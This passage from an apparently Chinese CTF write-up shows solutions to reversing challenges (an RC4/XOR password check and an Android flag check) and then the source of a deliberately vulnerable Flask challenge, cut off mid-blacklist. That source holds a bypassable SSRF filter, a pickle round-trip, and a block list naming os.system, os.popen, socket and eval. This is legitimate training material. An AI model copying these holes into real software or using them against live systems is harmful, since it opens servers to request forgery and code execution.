class="built_in">strcmp</span>(s1, s2) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>简单xor，可以直接计算出密码。注意<code>s2</code>的长度为31，不够需要补<code>\x00</code>。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">'_emolceW'</span>[::<span class="number">-1</span>]+<span class="string">'rever_ot'</span>[::<span class="number">-1</span>]+<span class="string">'llahc_es'</span>[::<span class="number">-1</span>]+<span class="string">'egne'</span>[::<span class="number">-1</span>]</span><br><span class="line">a = a.ljust(<span class="number">31</span>,<span class="string">'\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join( chr(Byte(<span class="number">0x401110</span>+i)^ord(a[i])) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)) )</span><br></pre></td></tr></table></figure></p><p>加密函数会打开<code>flag.txt</code>，然后用输入的密码生成一个key，再进行加密运算（著名逆向高手刘大神说是一个标准RC4）<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_400BDD</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *passwd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 passwd_len; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-42Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+18h] [rbp-428h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 flag_len; <span class="comment">// [rsp+20h] [rbp-420h]</span></span><br><span class="line">  FILE *v6; <span class="comment">// [rsp+28h] [rbp-418h]</span></span><br><span class="line">  <span class="keyword">char</span> key[<span class="number">256</span>]; <span class="comment">// [rsp+30h] [rbp-410h]</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">256</span>]; <span class="comment">// [rsp+130h] [rbp-310h]</span></span><br><span class="line">  <span class="keyword">char</span> flag; <span class="comment">// [rsp+230h] [rbp-210h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+438h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(key, <span class="number">0</span>, <span class="keyword">sizeof</span>(key));</span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="keyword">sizeof</span>(v8));</span><br><span class="line">  <span class="built_in">memset</span>(&amp;flag, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  fwrite(<span class="string">"hello root user\n"</span>, <span class="number">1u</span>LL, <span class="number">0x10</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">  stream = fopen(<span class="string">"./flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    fgets(&amp;flag, <span class="number">512</span>, stream);</span><br><span class="line">    flag_len = <span class="built_in">strlen</span>(&amp;flag);</span><br><span class="line">    fclose(stream);</span><br><span class="line">    passwd_len = <span class="built_in">strlen</span>(passwd);</span><br><span class="line">    init_key((__int64)key, (__int64)passwd, passwd_len);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">      v8[i] = key[i];</span><br><span class="line">    encrypt((__int64)key, (__int64)&amp;flag, flag_len);</span><br><span class="line">    v6 = fopen(<span class="string">"./enc.txt"</span>, <span class="string">"w"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(v6, <span class="string">"%s\n"</span>, &amp;flag);</span><br><span class="line">      fclose(v6);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Open Failed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Open Failed."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>查看<code>encrypt</code>，实际上涉及flag的运算只有最后一步的异或，因此无需逆算法。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">v6 = <span class="number">0</span>;</span><br><span class="line">v7 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0L</span>L; ; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  result = i;</span><br><span class="line">  <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  v6 = (<span class="keyword">unsigned</span> __int8)(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v6 + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>) + v6 + <span class="number">1</span>) - ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v6 + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>);</span><br><span class="line">  v3 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v7 + *(<span class="keyword">unsigned</span> __int8 *)(v6 + key)) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">  v7 = (<span class="keyword">unsigned</span> __int8)(v3 + v7 + *(_BYTE *)(v6 + key)) - v3;</span><br><span class="line">  v4 = *(_BYTE *)(v6 + key);</span><br><span class="line">  *(_BYTE *)(key + v6) = *(_BYTE *)(v7 + key);</span><br><span class="line">  *(_BYTE *)(key + v7) = v4;</span><br><span class="line">  *(_BYTE *)(flag + i) ^= *(_BYTE *)((<span class="keyword">unsigned</span> __int8)(*(_BYTE *)(v6 + key) + *(_BYTE *)(v7 + key)) + key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>只要将题目提供的<code>enc.txt</code>改名成<code>flag.txt</code>，然后进行一次加密，结果就出来了。</p><p><img src="http://md.36huo.com/uploads/upload_24ad93f1ba3e7df300462c2af2bb51b4.png" alt=""></p><h2 id="0x9-Mix"><a href="#0x9-Mix" class="headerlink" title="0x9 Mix"></a>0x9 Mix</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.mix;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View$OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>$<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    EditText et;</span><br><span class="line">    String pw;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MainActivity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.pw = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">this</span>.et = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg6)</span> </span>&#123;</span><br><span class="line">        Toast v0;</span><br><span class="line">        <span class="keyword">if</span>(arg6.getId() != <span class="number">0x7F070022</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.pw = <span class="keyword">this</span>.et.getText().toString();</span><br><span class="line">        <span class="keyword">int</span> v1 = <span class="number">17</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.pw.isEmpty()) &#123;</span><br><span class="line">            v0 = Toast.makeText(<span class="keyword">this</span>.getApplicationContext(), <span class="string">"NO"</span>, <span class="number">1</span>);</span><br><span class="line">            v0.setGravity(v1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            v0.show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(ctfmix.verify(<span class="keyword">this</span>.pw.trim())) &#123;</span><br><span class="line">            v0 = Toast.makeText(<span class="keyword">this</span>.getApplicationContext(), <span class="string">"YES"</span>, <span class="number">1</span>);</span><br><span class="line">            v0.setGravity(v1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            v0.show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        v0 = Toast.makeText(<span class="keyword">this</span>.getApplicationContext(), <span class="string">"NO"</span>, <span class="number">1</span>);</span><br><span class="line">        v0.setGravity(v1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        v0.show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(arg2);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(<span class="number">0x7F09001C</span>);</span><br><span class="line">        <span class="keyword">this</span>.et = <span class="keyword">this</span>.findViewById(<span class="number">0x7F070037</span>);</span><br><span class="line">        <span class="keyword">this</span>.findViewById(<span class="number">0x7F070022</span>).setOnClickListener(((View$OnClickListener)<span class="keyword">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>ctfmix.verify(this.pw.trim())</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.mix;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ctfmix</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">byte</span>[] ciphtext;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        ctfmix.ciphtext = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;-<span class="number">43</span>, -<span class="number">108</span>, -<span class="number">35</span>, -<span class="number">112</span>, -<span class="number">35</span>, -<span class="number">119</span>, -<span class="number">120</span>, -<span class="number">28</span>, -<span class="number">64</span>, -<span class="number">55</span>, -<span class="number">115</span>, -<span class="number">111</span>, -<span class="number">112</span>, -<span class="number">55</span>, -<span class="number">112</span>, -<span class="number">44</span>, -<span class="number">40</span>, -<span class="number">52</span>, -<span class="number">32</span>, -<span class="number">44</span>, -<span class="number">60</span>, -<span class="number">43</span>, -<span class="number">124</span>, -<span class="number">36</span>, -<span class="number">59</span>, -<span class="number">115</span>, -<span class="number">112</span>, -<span class="number">52</span>, -<span class="number">32</span>, -<span class="number">32</span>, -<span class="number">63</span>, -<span class="number">116</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ctfmix</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] change(<span class="keyword">byte</span>[] arg5) &#123;</span><br><span class="line">        <span class="keyword">int</span> v4;</span><br><span class="line">        <span class="keyword">int</span> v0 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> v1 = arg5.length;</span><br><span class="line">        <span class="keyword">int</span> v2 = arg5[<span class="number">0</span>] &gt;&gt; <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            v4 = <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">if</span>(v0 &gt;= v1 - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            arg5[v0] = ((<span class="keyword">byte</span>)(v4 * arg5[v0] &amp; <span class="number">0xFF</span> | arg5[v0 + <span class="number">1</span>] &gt;&gt; <span class="number">6</span>));</span><br><span class="line">            ++v0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        arg5[v1 - <span class="number">1</span>] = ((<span class="keyword">byte</span>)(v4 * arg5[v1 - <span class="number">1</span>] &amp; <span class="number">0xFF</span> | v2));</span><br><span class="line">        <span class="keyword">return</span> arg5;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">verify</span><span class="params">(String arg4)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(arg4.endsWith(<span class="string">"&#125;"</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!arg4.startsWith(<span class="string">"ctf&#123;"</span>)) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(Arrays.equals(ctfmix.change(arg4.substring(<span class="number">4</span>, arg4.length() - <span class="number">1</span>).getBytes()), ctfmix.ciphtext)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数先检查输入的开头和结尾，熟悉的flag格式<code>ctf{}</code>，然后中间的字符再进入change函数验证。</p><p>关键代码是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg5[v0] = ((byte)(4 * arg5[v0] &amp; 0xFF | arg5[v0 + 1] &gt;&gt; 6));</span><br></pre></td></tr></table></figure></p><p>这串运算相当于吧arg5[v0]左移两位，然后把下一个字符arg5[v0+1]的高两位放到arg5[v0]的低两位。因此逆运算只要把整串字符串二进制循环右移两位即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">-43</span>, <span class="number">-108</span>, <span class="number">-35</span>, <span class="number">-112</span>, <span class="number">-35</span>, <span class="number">-119</span>, <span class="number">-120</span>, <span class="number">-28</span>, <span class="number">-64</span>, <span class="number">-55</span>, <span class="number">-115</span>, <span class="number">-111</span>, <span class="number">-112</span>, <span class="number">-55</span>, <span class="number">-112</span>, <span class="number">-44</span>, <span class="number">-40</span>, <span class="number">-52</span>, <span class="number">-32</span>, <span class="number">-44</span>, <span class="number">-60</span>, <span class="number">-43</span>, <span class="number">-124</span>, <span class="number">-36</span>, <span class="number">-59</span>, <span class="number">-115</span>, <span class="number">-112</span>, <span class="number">-52</span>, <span class="number">-32</span>, <span class="number">-32</span>, <span class="number">-63</span>, <span class="number">-116</span>]</span><br><span class="line"></span><br><span class="line">m = <span class="string">''</span>.join([bin(x%<span class="number">256</span>)[<span class="number">2</span>:] <span class="keyword">for</span> x <span class="keyword">in</span> a])</span><br><span class="line"><span class="comment"># print m</span></span><br><span class="line"></span><br><span class="line">flag = m[<span class="number">-2</span>:] + m[:<span class="number">-2</span>]</span><br><span class="line"><span class="keyword">print</span> hex(int(flag,<span class="number">2</span>))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><h2 id="0xA-welcome"><a href="#0xA-welcome" class="headerlink" title="0xA welcome"></a>0xA welcome</h2><p>略</p><h2 id="0xB-babyROP"><a href="#0xB-babyROP" class="headerlink" title="0xB babyROP"></a>0xB babyROP</h2><p>这是抄X-man入门系列的吧，略。</p><h2 id="0xC-notfound"><a href="#0xC-notfound" class="headerlink" title="0xC notfound"></a>0xC notfound</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session , Request ,Response,request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> inet_aton</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"></span><br><span class="line"><span class="comment"># import urllib.error</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;title&gt;404 not found&lt;/title&gt;&lt;h1&gt;Not found!&lt;/h1&gt;&lt;script&gt;alert("Oops! somethis wrong!")&lt;/script&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/robots.txt')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">routes</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/getpar',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpaar</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        info = request.args[<span class="string">'cc'</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file_info = getinfos(info)</span><br><span class="line">            m = gets(file_info)</span><br><span class="line">            <span class="keyword">return</span> m</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'Error'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"no foud"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get a strong  defense from SSRF</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeip</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> is_inner_ipaddress(url):</span><br><span class="line">            ip = <span class="string">""</span></span><br><span class="line">            <span class="keyword">return</span> ip</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    ip = socket.gethostbyname(url)</span><br><span class="line">    <span class="keyword">return</span> ip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gets</span><span class="params">(info)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(info) == str:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ip = changeip(info)</span><br><span class="line">            url = <span class="string">'http://'</span> + ip </span><br><span class="line">            res = urllib.request.urlopen(url).read()</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'Oops'</span></span><br><span class="line">    <span class="keyword">elif</span> type(info) == list:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ip = changeip(info[<span class="number">0</span>])</span><br><span class="line">            url = <span class="string">"http://"</span> + ip </span><br><span class="line">            res = urllib.request.urlopen(url).read()</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Oops"</span></span><br><span class="line">    <span class="keyword">elif</span> type(info) == dict:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ip = info[<span class="string">'url'</span>]</span><br><span class="line">            ip = changeip(ip)</span><br><span class="line">            path = info[<span class="string">'path'</span>] <span class="keyword">if</span> <span class="string">'path'</span> <span class="keyword">in</span> info.keys() <span class="keyword">else</span> <span class="string">''</span></span><br><span class="line">            url = info[<span class="string">'http'</span>] + ip + path</span><br><span class="line">            res = urllib.request.urlopen(url).read()</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Oops"</span></span><br><span class="line">    <span class="comment"># juge it is class </span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">import</span> pickle,builtins, io</span><br><span class="line">            s = pickle.dumps(info)</span><br><span class="line">            res = pickle.loads(s)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Oops"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getinfos</span><span class="params">(param)</span>:</span></span><br><span class="line">    black_type_list = [<span class="string">'import'</span>,<span class="string">'eval'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'open'</span>, <span class="string">'os.system'</span>, <span class="string">'os.popen'</span>,<span class="string">'socket'</span>,<span class="string">'socketserver'</span>,</span><br><span class="line">    <span class="string">'os.popen2'</span>, <span class="string">'os.popen3'</span>, <span class="string">'os.popen4'</span>, <span class="string">'os.fdopen'</span>, <span class="string">'os.tmpfile'</span>, <span class="string">'os.fchmod'</span>,</span><br><span class="line">    <span class="string">'os.fchown'</span>, <span class="string">'os.open'</span>, <span class="string">'os.openpty'</span>, <span class="string">'os.read'</span>, <span class="string">'os.pipe'</span>, <span class="string">'os.chdir'</span>, <span class="string">'os.fchdir'</span>,</span><br><span class="line">    <span class="string">'os.chroot'</span>, <span 